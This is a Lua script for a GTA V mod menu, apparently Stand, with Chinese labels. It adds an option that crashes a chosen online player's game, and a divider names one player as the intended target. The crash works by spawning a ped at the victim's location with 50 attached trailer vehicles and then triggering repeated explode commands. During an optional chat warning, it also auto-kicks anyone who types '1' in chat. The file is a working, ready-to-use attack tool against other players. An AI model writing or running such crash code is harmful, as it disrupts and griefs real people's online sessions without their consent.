util.keep_running()
util.require_natives("natives-1663599433")






local function player(pid) 
menu.divider(menu.player_root(pid), "xipro专崩")
    
	

    local crash = menu.list(menu.player_root(pid), "选择你的崩溃方式", {}, "")

	seven_warn=true

	

	menu.toggle(crash,"崩溃前7秒警告",{},"",function (on)
		seven_warn=on
		
	
	end,true)


    menu.action(crash, "开崩", {"crash_xipro=>"}, "懒得研究别的 能用不久行了", function()
	
		if seven_warn==true then
			chat.send_message("请注意 将在7秒后崩溃xipro 公屏发送数字 1 可更换战局",false,true,true)
		
	
		util.yield(200)
		
		
		
		
	
			chat.on_message(function(sender, reserved, text, team_chat, networked, is_auto)
				if string.find(text,"1") then
				util.toast("find 1")
				menu.trigger_commands("kick" .. players.get_name(sender))
				end
				--我不知道OnMessage这个监听器能不能关掉 监听器一直在就会一直踢发1的人 所以就直接崩完关脚本了... 
				
			end)
			util.yield(6000)
		end

		util.request_model("a_m_y_beach_04", 300)
		
		util.request_model("raketrailer", 300)
		util.yield(1000)
			local player_ped_location = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
                   
					local ped_to_collect = entities.create_ped(0 , util.joaat("a_m_y_beach_04"), player_ped_location, 0)
			for j = 1,50,1 do
			
			
					local model = {util.joaat("raketrailer"),}
                    
                    ENTITY.SET_ENTITY_VISIBLE(ped_to_collect, true)
                    
                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ped_to_collect, player_ped_location.x, player_ped_location.y, player_ped_location.z)
                        for spawn, value in pairs(model) do
                            local vels = {}
                            vels[spawn] = entities.create_vehicle(value, player_ped_location, 0)
							
                            for value,value1 in pairs(vels) do
                                ENTITY.ATTACH_ENTITY_BONE_TO_ENTITY_BONE_Y_FORWARD(value1, ped_to_collect, 0, 0, true, true)
                            end
                        end
                        
                    
					
			
			end
			util.yield(300)
				
                        menu.trigger_commands("explode" ..  players.get_name(pid)) 
						menu.trigger_commands("explode" ..  players.get_name(pid))
						menu.trigger_commands("explode" ..  players.get_name(pid))
						util.yield(1000)
						
util.toast("崩溃完成 关闭脚本")
util.stop_script()	
				
end)



					










			
			

	

end
players.on_join(player)
players.dispatch_on_join()

menu.divider(menu.my_root()," ")
menu.divider(menu.my_root(),"崩溃在玩家列表里选择玩家,划到最底下")
menu.divider(menu.my_root()," ")
menu.hyperlink(menu.my_root(), "南瓜的GTA5交流群 点击加入", "https://jq.qq.com/?_wv=1027&k=gl4IRi7a")